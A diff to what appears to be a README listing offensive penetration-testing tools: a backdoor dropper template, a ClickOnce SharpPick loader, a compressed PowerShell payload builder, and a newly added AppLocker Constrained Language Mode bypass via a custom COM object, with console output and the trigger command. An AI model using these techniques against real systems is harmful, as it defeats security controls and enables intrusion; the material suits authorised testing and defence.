@@ -4,6 +4,44 @@
 
 - **`backdoor-drop.js`** - Internet Explorer - JavaScript trojan/backdoor dropper template, to be used during Penetration Testing assessments. ([gist](https://gist.github.com/mgeeky/b0aed7c1e510560db50f96604b150dac))
 
+- **`Bypass-ConstrainedLanguageMode`** - Tries to bypass AppLocker Constrained Language Mode via custom COM object (as documented by @xpn in: https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/ )
+The way it does so is by registering a custom COM object (`InProcServer32` DLL) that will act as a native *.NET CLR4* host. This host is then going to load up a managed assembly within it's current AppDomain. That assembly finally will switch `SessionData.LanguageMode` variable determining whether Constrained Language Mode shall be used within current Runspace. More details in the tool directory itself.
+
+```
+PS >  $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage 
+PS > .\Bypass-CLM.ps1
+        AppLocker Constrined Language Mode Bypass via COM
+        (implementation of: @xpn's technique, as documented in:)
+        (https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/)
+
+        Re-implemented, enhanced by: Mariusz B., mgeeky
+        -----
+
+[.] Step 0. Planted DLL files in:
+        C:\Users\danj\AppData\Local\Temp\ClmDisableAssembly.dll
+        C:\Users\danj\AppData\Local\Temp\ClmDisableDll.dll
+[.] Step 1. Creating custom COM object.
+[.] Step 2. Invoking it (ClmDisableDll)...
+        Powershell runspace Thread ID: 8716
+[+] Managed mode assembly. Disabling CLM globally.
+        Current thread ID (managed/unmanaged): 8 / 8716
+        Passed argument: '(called from native CLR host)'
+
+============
+Use below command to disable CLM on Demand (ignore errors):
+
+        PS> New-Object -ComObject ClmDisableDll
+
+============
+
+[+] Finished. CLM status: FullLanguage
+
+PS > New-Object -ComObject ClmDisableDll
+PS > $ExecutionContext.SessionState.LanguageMode
+FullLanguage 
+```
+
 - **`clickOnceSharpPickTemplate.cs`** - This is a template for **C# Console Project** containing [SharpPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) technique of loading Powershell code from within C# application. The ClickOnce concept is to generate a windows self-updating Application that is specially privileged ([ClickOnce](https://www.slideshare.net/NetSPI/all-you-need-is-one-a-click-once-love-story-secure360-2015))
 
 - **`compressedPowershell.py`** - Creates a Powershell snippet containing GZIP-Compressed payload that will get decompressed and executed (IEX)
